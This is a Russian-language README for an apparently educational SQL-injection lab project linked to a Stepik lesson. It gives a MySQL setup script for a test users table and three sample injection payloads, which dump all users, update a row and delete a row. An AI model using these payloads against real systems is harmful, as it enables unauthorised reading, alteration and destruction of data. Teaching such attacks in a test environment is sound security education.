### Тестовый проект для SQL инъекций.
К уроку https://stepik.org/lesson/1364135/step/1?unit=1380046  
  
Скрипт в MySQL для создания тестовой таблицы и вставки данных:
```
CREATE DATABASE sql_injection;
USE sql_injection;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_name VARCHAR(255) NOT NULL
);

INSERT INTO users (user_name) VALUES ('user1'), ('user2'), ('user3'), ('user4'), ('user5');
```
При вводе в форму имени пользователя - будет выводиться данный пользователь, если он найден.
  
Возможные вредосносные инъекции:
![image](https://github.com/user-attachments/assets/dc175676-c9cc-44de-b5c5-d3f7c87c6c7f)
  
Вывести всех пользвоателей:
```
' OR '1'='1; --
```
  
Изменить пользователя в таблице:
```
'; UPDATE users SET username = 'hacked' WHERE id = 2; --
```
  
Удалить пользователя в таблице:
```
'; DELETE FROM users WHERE id = 1; --
```
  

